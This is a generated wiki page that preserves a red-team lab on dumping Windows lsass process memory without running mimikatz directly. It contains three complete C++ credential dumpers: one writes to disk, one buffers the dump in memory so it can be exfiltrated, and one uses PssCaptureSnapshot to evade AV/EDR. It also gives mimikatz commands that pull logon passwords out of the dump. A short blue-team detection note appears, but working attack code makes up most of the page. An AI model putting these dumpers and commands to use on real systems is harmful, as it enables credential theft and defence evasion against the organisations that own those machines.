---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping Lsass without Mimikatz with MiniDumpWriteDump

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Dumping Lsass without Mimikatz with MiniDumpWriteDump](../../topics/offensive-security/dumping-lsass-without-mimikatz-with-minidumpwritedump.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass |
| name | Dumping Lsass without Mimikatz with MiniDumpWriteDump |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2019-03-23 21-25.gif
- Peek 2019-03-23 22-16.gif
- Screenshot from 2019-03-23 17-01-44.png
- Screenshot from 2019-03-23 17-08-29.png
- Screenshot from 2019-03-23 21-26-41.png
- capture-snapshot-lsass.gif
- image (358).png
- image (359).png
- minidumpwritedump-dump-to-memory.gif
_body: "---\ndescription: Evasion, Credential Dumping\n---\n\n# Dumping Lsass without Mimikatz with MiniDumpWriteDump\n\n\
  This lab explores multiple ways of how we can write a simple `lsass` process dumper using `MiniDumpWriteDump` API. Lsass\
  \ process dumps created with `MiniDumpWriteDump` can be loaded to mimikatz offline, where credential materials could be\
  \ extracted.\n\n{% hint style=\"warning\" %}\nNote that you may get flagged by AVs/EDRs for reading lsass process memory.\
  \ Depending on what AV/EDR you are dealing with, see other notes:\\\n[Bypassing Cylance and other AVs/EDRs by Unhooking\
  \ Windows APIs](../defense-evasion/bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis.md) and [Full DLL Unhooking\
  \ with C++](../defense-evasion/how-to-unhook-a-dll-using-c++.md)\n{% endhint %}\n\n## MiniDumpWriteDump to Disk\n\nIt's\
  \ possible to use `MiniDumpWriteDump` API call to dump lsass process memory.\n\n### Code\n\n{% code title=\"dumper.cpp\"\
  \ %}\n```cpp\n#include \"stdafx.h\"\n#include <windows.h>\n#include <DbgHelp.h>\n#include <iostream>\n#include <TlHelp32.h>\n\
  using namespace std;\n\nint main() {\n\tDWORD lsassPID = 0;\n\tHANDLE lsassHandle = NULL; \n\n\t// Open a handle to lsass.dmp\
  \ - this is where the minidump file will be saved to\n\tHANDLE outFile = CreateFile(L\"lsass.dmp\", GENERIC_ALL, 0, NULL,\
  \ CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n\n\t// Find lsass PID\t\n\tHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,\
  \ 0);\n\tPROCESSENTRY32 processEntry = {};\n\tprocessEntry.dwSize = sizeof(PROCESSENTRY32);\n\tLPCWSTR processName = L\"\
  \";\n\n\tif (Process32First(snapshot, &processEntry)) {\n\t\twhile (_wcsicmp(processName, L\"lsass.exe\") != 0) {\n\t\t\t\
  Process32Next(snapshot, &processEntry);\n\t\t\tprocessName = processEntry.szExeFile;\n\t\t\tlsassPID = processEntry.th32ProcessID;\n\
  \t\t}\n\t\twcout << \"[+] Got lsass.exe PID: \" << lsassPID << endl;\n\t}\n\t\n\t// Open handle to lsass.exe process\n\t\
  lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);\n\t\n\t// Create minidump\n\tBOOL isDumped = MiniDumpWriteDump(lsassHandle,\
  \ lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);\n\t\n\tif (isDumped) {\n\t\tcout << \"[+] lsass dumped successfully!\"\
  \ << endl;\n\t}\n\t\n    return 0;\n}\n```\n{% endcode %}\n\n{% file src=\"../../.gitbook/assets/CreateMiniDump (1).exe\"\
  \ %}\nCreateMiniDump.exe\n{% endfile %}\n\nDo not forget to add `dbghelp.lib` as a dependency in the Linker > Input settings\
  \ for your C++ project if the compiler is giving you a hard time:\n\n![](<../../.gitbook/assets/Screenshot from 2019-03-23\
  \ 17-01-44.png>)\n\n{% hint style=\"info\" %}\nOr simply include at the top of the source code:\\\n`#pragma comment (lib,\
  \ \"Dbghelp.lib\")`\n{% endhint %}\n\n### Demo\n\n1. Execute CreateMiniDump.exe (compiled file above) or compile your own\
  \ binary\n2. Lsass.dmp gets dumped to the working directory\n3. Take the lsass.dmp offline to your attacking machine\n4.\
  \ Open mimikatz and load in the dump file&#x20;\n5. Dump passwords\n\n{% code title=\"attacker\" %}\n```csharp\n.\\createminidump.exe\n\
  .\\mimikatz.exe\nsekurlsa::minidump c:\\temp\\lsass.dmp\nsekurlsa::logonpasswords\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Peek\
  \ 2019-03-23 22-16.gif>)\n\n### Why it's worth it?\n\nSee how Windows Defender on Windows 10 is flagging up mimikatz immediately...\
  \ but allows running CreateMiniDump.exe? Good for us - we get lsass.exe dumped to `lsass.dmp`:\n\n![](<../../.gitbook/assets/Peek\
  \ 2019-03-23 21-25.gif>)\n\n..which then can be read in mimikatz offline:\n\n![](<../../.gitbook/assets/Screenshot from\
  \ 2019-03-23 21-26-41.png>)\n\nOf ourse, there is Sysinternal's `procdump` that does the same thing and it does not get\
  \ flagged by Windows defender, but it is always good to know there are alternatives you could turn to if you need to for\
  \ whatever reason.&#x20;\n\n### Observations\n\nAs mentioned earlier, the code above uses a native windows API call `MiniDumpWriteDump`\
  \ to make a memory dump of a given process. If you are on the blue team and trying to write detections for these activities,\
  \ you may consider looking for processes loading in `dbghelp.dll` module and calling `MiniDumpWriteDump` function:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-03-23 17-08-29.png>)\n\n## MiniDumpWriteDump to Memory using MiniDump Callbacks\n\nBy default, `MiniDumpWriteDump`\
  \ will dump lsass process memory to disk, however it's possible to use `MINIDUMP_CALLBACK_INFORMATION` callbacks to create\
  \ a process minidump and store it memory, where we could encrypt it before dropping to disk or exfiltrate it over the network.\n\
  \n### Code\n\nThe below code shows how we can create a minidump for lsass and store its buffer in memory, where we can process\
  \ it as required:\n\n```cpp\n#include <windows.h>\n#include <DbgHelp.h>\n#include <iostream>\n#include <TlHelp32.h>\n#include\
  \ <processsnapshot.h>\n#pragma comment (lib, \"Dbghelp.lib\")\n\nusing namespace std;\n\n// Buffer for saving the minidump\n\
  LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);\nDWORD bytesRead = 0;\n\nBOOL CALLBACK\
  \ minidumpCallback(\n\t__in     PVOID callbackParam,\n\t__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,\n\t__inout\
  \  PMINIDUMP_CALLBACK_OUTPUT callbackOutput\n)\n{\n\tLPVOID destination = 0, source = 0;\n\tDWORD bufferSize = 0;\n\n\t\
  switch (callbackInput->CallbackType)\n\t{\n\t\tcase IoStartCallback:\n\t\t\tcallbackOutput->Status = S_FALSE;\n\t\t\tbreak;\n\
  \n\t\t// Gets called for each lsass process memory read operation\n\t\tcase IoWriteAllCallback:\n\t\t\tcallbackOutput->Status\
  \ = S_OK;\n\t\t\t\n\t\t\t// A chunk of minidump data that's been jus read from lsass. \n\t\t\t// This is the data that would\
  \ eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want\
  \ with it.\n\t\t\t// We will simply save it to dumpBuffer.\n\t\t\tsource = callbackInput->Io.Buffer;\n\t\t\t\n\t\t\t// Calculate\
  \ location of where we want to store this part of the dump.\n\t\t\t// Destination is start of our dumpBuffer + the offset\
  \ of the minidump data\n\t\t\tdestination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);\n\t\t\
  \t\n\t\t\t// Size of the chunk of minidump that's just been read.\n\t\t\tbufferSize = callbackInput->Io.BufferBytes;\n\t\
  \t\tbytesRead += bufferSize;\n\t\t\t\n\t\t\tRtlCopyMemory(destination, source, bufferSize);\n\t\t\t\n\t\t\tprintf(\"[+]\
  \ Minidump offset: 0x%x; length: 0x%x\\n\", callbackInput->Io.Offset, bufferSize);\n\t\t\tbreak;\n\n\t\tcase IoFinishCallback:\n\
  \t\t\tcallbackOutput->Status = S_OK;\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\treturn true;\n\t}\n\treturn TRUE;\n}\n\nint main()\
  \ {\n\tDWORD lsassPID = 0;\n\tDWORD bytesWritten = 0;\n\tHANDLE lsassHandle = NULL;\n\tHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,\
  \ 0);\n\tLPCWSTR processName = L\"\";\n\tPROCESSENTRY32 processEntry = {};\n\tprocessEntry.dwSize = sizeof(PROCESSENTRY32);\n\
  \n\t// Get lsass PID\n\tif (Process32First(snapshot, &processEntry)) {\n\t\twhile (_wcsicmp(processName, L\"lsass.exe\"\
  ) != 0) {\n\t\t\tProcess32Next(snapshot, &processEntry);\n\t\t\tprocessName = processEntry.szExeFile;\n\t\t\tlsassPID =\
  \ processEntry.th32ProcessID;\n\t\t}\n\t\tprintf(\"[+] lsass PID=0x%x\\n\",lsassPID);\n\t}\n\n\tlsassHandle = OpenProcess(PROCESS_ALL_ACCESS,\
  \ 0, lsassPID);\n\t\n\t// Set up minidump callback\n\tMINIDUMP_CALLBACK_INFORMATION callbackInfo;\n\tZeroMemory(&callbackInfo,\
  \ sizeof(MINIDUMP_CALLBACK_INFORMATION));\n\tcallbackInfo.CallbackRoutine = &minidumpCallback;\n\tcallbackInfo.CallbackParam\
  \ = NULL;\n\n\t// Dump lsass\n\tBOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL,\
  \ NULL, &callbackInfo);\n\n\tif (isDumped) \n\t{\n\t\t// At this point, we have the lsass dump in memory at location dumpBuffer\
  \ - we can do whatever we want with that buffer, i.e encrypt & exfiltrate\n\t\tprintf(\"\\n[+] lsass dumped to memory 0x%p\\\
  n\", dumpBuffer);\n\t\tHANDLE outFile = CreateFile(L\"c:\\\\temp\\\\lsass.dmp\", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,\
  \ NULL);\n\t\n\t\t// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz\
  \ can work it\n\t\tif (WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL))\n\t\t{\n\t\t\tprintf(\"\\n[+] lsass\
  \ dumped from 0x%p to c:\\\\temp\\\\lsass.dmp\\n\", dumpBuffer, bytesWritten);\n\t\t}\n\t}\n\t\n\treturn 0;\n}\n```\n\n\
  Thanks [Niall Newman](https://twitter.com/NiallNSec) for pointing me to [SafetyDump](https://github.com/m0rv4i/SafetyDump/blob/master/SafetyDump/Program.cs)\
  \ by [@m0rv4i](https://twitter.com/m0rv4i), who implemented `MiniDumpWriteDump` with callbacks in C#, which I used as a\
  \ guide for implementing the callback logic.\n\n### Demo\n\nOn the left, `0x00000135B8291040` (`dumpBuffer`) gets populated\
  \ with minidump data after the `MiniDumpWriteDump` API is called.\n\nOn the right, we're executing the same code and it\
  \ says that the minidump was written to our buffer at `0x000001AEA0BC4040`. For testing purposes, bytes from the same buffer\
  \ `0x000001AEA0BC4040` were also written to `c:\\temp\\lsass.dmp` using `WriteFile`, so that we could load the lsass dump\
  \ to mimikatz (bottom right) and ensure it's not corrupted and credentials can be retrieved:\n\n![MiniDumpWriteDump dumping\
  \ lsass process to a memory location](../../.gitbook/assets/minidumpwritedump-dump-to-memory.gif)\n\n{% hint style=\"info\"\
  \ %}\nIf you ever try using `MiniDumpWriteDump` to dump process memory to memory using named pipes, you will notice that\
  \ the minidump file \"kind of\" gets created, but mimikatz is not able to read it. That's because the minidump buffer is\
  \ actually written non-sequentially (you can see this from the screenshot in the top right corner - note the differing offsets\
  \ of the write operations of the minidump data), so when you are reading the minidump using named pipes, you simply are\
  \ writting the minidump data in incorrect order, which effectively produces a corrupted minidump file.\n{% endhint %}\n\n\
  ### Other Ways\n\nBelow are links to a couple of other cool solutions to the same problem.\n\nCustom `MiniDumpWriteDump`\
  \ implementation, based on the one from ReactOS:\n\n{% embed url=\"https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump\"\
  \ %}\n\nHooking `dbgcore.dll!Win32FileOutputProvider::WriteAll` to intercept the minidump data before it's written to disk:\n\
  \n{% embed url=\"https://adepts.of0x.cc/hookson-hootoff/\" %}\n\n## MiniDumpWriteDump + PssCaptureSnapshot\n\n`PssCaptureSnapshot`\
  \ is another Windows API that lets us dump lsass process using `MiniDumpWriteDump` that may help us sneak past some AVs/EDRs\
  \ for now.\n\n{% hint style=\"info\" %}\nThe benefit of using `PssCaptureSnapshot` is that when `MiniDumpWriteDump` is called\
  \ from your malware, it will not be reading lsass process memory directly and instead will do so from the process's snapshot.\n\
  {% endhint %}\n\nBelow is the modified dumper code that uses the `PssCaptureSnapshot` to obtain a snapshot of the lsass\
  \ process. The handle that is returned by the `PssCaptureSnapshot` is then used in the `MiniDumpWriteDump` call instead\
  \ of the lsass process handle. This is done via the minidump callback:\n\n```cpp\n#include \"stdafx.h\"\n#include <windows.h>\n\
  #include <DbgHelp.h>\n#include <iostream>\n#include <TlHelp32.h>\n#include <processsnapshot.h>\n#pragma comment (lib, \"\
  Dbghelp.lib\")\n\nusing namespace std;\n\nBOOL CALLBACK MyMiniDumpWriteDumpCallback(\n\t__in     PVOID CallbackParam,\n\t\
  __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,\n\t__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput\n)\n{\n\tswitch\
  \ (CallbackInput->CallbackType)\n\t{\n\tcase 16: // IsProcessSnapshotCallback\n\t\tCallbackOutput->Status = S_FALSE;\n\t\
  \tbreak;\n\t}\n\treturn TRUE;\n}\n\nint main() {\n\tDWORD lsassPID = 0;\n\tHANDLE lsassHandle = NULL;\n\tHANDLE outFile\
  \ = CreateFile(L\"c:\\\\temp\\\\lsass.dmp\", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n\tHANDLE\
  \ snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tPROCESSENTRY32 processEntry = {};\n\tprocessEntry.dwSize\
  \ = sizeof(PROCESSENTRY32);\n\tLPCWSTR processName = L\"\";\n\n\tif (Process32First(snapshot, &processEntry)) {\n\t\twhile\
  \ (_wcsicmp(processName, L\"lsass.exe\") != 0) {\n\t\t\tProcess32Next(snapshot, &processEntry);\n\t\t\tprocessName = processEntry.szExeFile;\n\
  \t\t\tlsassPID = processEntry.th32ProcessID;\n\t\t}\n\t\twcout << \"[+] Got lsass.exe PID: \" << lsassPID << endl;\n\t}\n\
  \n\tlsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);\n\n\tHANDLE snapshotHandle = NULL;\n\tDWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE\
  \ | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION\
  \ | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED |\
  \ PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;\n\t\
  MINIDUMP_CALLBACK_INFORMATION CallbackInfo;\n\tZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));\n\tCallbackInfo.CallbackRoutine\
  \ = &MyMiniDumpWriteDumpCallback;\n\tCallbackInfo.CallbackParam = NULL;\n\n\tPssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags,\
  \ CONTEXT_ALL, (HPSS*)&snapshotHandle);\n\n\tBOOL isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory,\
  \ NULL, NULL, &CallbackInfo);\n\n\tif (isDumped) {\n\t\tcout << \"[+] lsass dumped successfully!\" << endl;\n\t}\n\n\tPssFreeSnapshot(GetCurrentProcess(),\
  \ (HPSS)snapshotHandle);\n\treturn 0;\n}\n```\n\n![](../../.gitbook/assets/capture-snapshot-lsass.gif)\n\nNote that this\
  \ is the way `procdump.exe` works when `-r` flag is specified:&#x20;\n\n![procdump help](<../../.gitbook/assets/image (358).png>)\n\
  \nTo confirm, if we execute procdump like so:\n\n```\nprocdump -accepteula -r -ma lsass.exe lsass.dmp\n```\n\n...and inspect\
  \ the APIs that are being called under the hood, we will see that `procdump` is indeed dynamically resolving the `PssCaptureSnapshot`\
  \ address inside the `kernel32.dll`:\n\n![](<../../.gitbook/assets/image (359).png>)\n\n## References\n\n{% embed url=\"\
  https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump\" %}\n\n{% embed\
  \ url=\"https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot\" %}\n\n{% embed\
  \ url=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/win32/api/processsnapshot/nf-processsnapshot-psscapturesnapshot\"\
  \ %}\n\n{% embed url=\"https://github.com/m0rv4i/SafetyDump/blob/master/SafetyDump/Program.cs\" %}"
_relative_path: offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass.md
````
